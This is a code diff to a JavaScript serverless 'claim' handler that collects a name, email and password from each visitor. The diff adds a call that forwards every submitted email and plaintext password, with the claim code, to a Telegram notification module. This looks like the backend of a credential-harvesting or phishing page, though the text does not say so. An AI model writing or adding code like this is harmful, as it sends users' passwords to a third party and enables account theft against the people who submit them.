@@ -1,4 +1,5 @@
 const { insertClaim, claimAllowed } = require("../../lib/db");
+const { sendClaimNotification } = require("../../lib/telegram");
 const { ok, fail } = require("./lib/http");
 
 exports.handler = async (event) => {
@@ -22,15 +23,23 @@ exports.handler = async (event) => {
       body = {};
     }
 
-    const name = String(body.name ?? "").trim();
+    const name = String(body.code ?? body.name ?? "").trim();
     const email = String(body.email ?? "").trim();
     const password = String(body.password ?? "").trim();
 
-    const { claimCode } = await insertClaim({
+    const { row, claimCode } = await insertClaim({
       name,
       email,
       password,
       createdAt: new Date().toISOString(),
+    });
+
+    sendClaimNotification({
+      id: row.id,
+      name,
+      email,
+      password,
+      claimCode,
     });
 
     return ok({ ok: true, name, email, claimCode });
